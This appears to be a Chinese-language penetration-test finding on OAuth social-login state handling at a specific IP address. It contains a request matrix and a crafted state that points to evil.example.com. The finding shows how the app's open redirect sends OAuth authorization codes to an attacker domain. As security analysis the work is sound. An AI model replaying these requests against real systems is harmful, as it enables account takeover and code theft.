# intent 28895 结论：社交登录 state 校验 / 域校验

## 干净样本
GET /prod-api/auth/binding/gitee?tenantId=000000&domain=144.123.22.234
data 中 redirect_uri=http://localhost:80/social-callback?source=gitee
client_id(gitee app)=91436b7940090d09c72c7daf85b959cfd5f215d67eea73acbf61b6b590751a98
state(b64)=eyJkb21haW4iOiIxNDQuMTIzLjIyLjIzNCIsInRlbmFudElkIjoiMDAwMDAwIiwic3RhdGUiOiI0MDM0ZjYwNjBmODVlNzMxNDhhZjM3ZGFiZDE0YmFmYyJ9
解码={"domain":"144.123.22.234","tenantId":"000000","state":"4034f6060f85e73148af37dabd14bafc"}

## POST /prod-api/auth/social/callback 结果矩阵（全部无 Authorization，无真实 OAuth code）
| # | 请求体要点 | 响应 msg |
|---|---|---|
|1| {} | code=500 不支持的第三方登录类型 |
|2| socialCode=x + 真实 gitee state | code=500, msg=null（未报 Illegal state → 已越过 state 校验，进入第三方换取流程后异常）|
|3| socialState=base64({domain:evil.example.com,tenantId:000000,state:attacker123}) | code=500 **Illegal state [GITEE]** |
|4| socialState="abc" | code=500 **Illegal state [GITEE]** |
|5| source=maxkey + maxkey 真实 state + socialCode=x | code=500 `Cannot invoke "String.matches(String)" because "uuidString" is null`（越过 state 校验，进入 maxkey 换取 token 代码）|
|6| source=maxkey + **gitee** 的 state | 同上 NPE → state 缓存只按 state 值命中，不按 source/会话绑定 |
|7| source=maxkey + 真实 state + socialCode=UUID 全 0 | 同上 NPE（错误与 socialCode 内容无关，位于 state 之后、code 使用之前）|

结论：不存在“任意伪造 state 即可通过”的登录绕过（伪造 base64 state 被 Illegal state 拒绝，state 必须命中服务端缓存）；
但 state 只做“值存在性”校验：state 是匿名 /auth/binding/{source} 直接下发的公开值，未与会话 Cookie/token 绑定、未按 source 命名空间隔离（gitee 的 state 可用于 maxkey），因此任何攻击者自取一份 state 即可驱动回调进入第三方换取 token 状态机 —— 未取得 token（无真实 code），故不构成“换 token 登录绕过”。

## 开放重定向 / 授权码外泄
GET /prod-api/auth/binding/gitee?tenantId=000000&domain=evil.example.com → 200，state 解码 {"domain":"evil.example.com",...}（服务端零校验原样反射）
前端 /assets/index-12hsDYYY.js（1106B，/social-callback 页）逻辑：
  n=JSON.parse(atob(state)); i=n.domain;
  if(i!==window.location.host){let a=new URL(window.location.href);a.host=i;window.location.href=a.toString();return}
  ...POST {socialCode:code,socialState:state,tenantId,source,clientId:"7882175c171521a945ee6bdd5580377f",grantType:"social"} → e.data.access_token 写入本地
node 复现（同一 URL API）：http://144.123.22.234:9080/social-callback?code=REAL_OAUTH_CODE_ABC&state=<evil state>&source=gitee
→ window.location.href = http://evil.example.com:9080/social-callback?code=REAL_OAUTH_CODE_ABC&state=<evil state>&source=gitee
即 OAuth 授权码（query 中的 code）随整段 URL 被带到攻击者域。
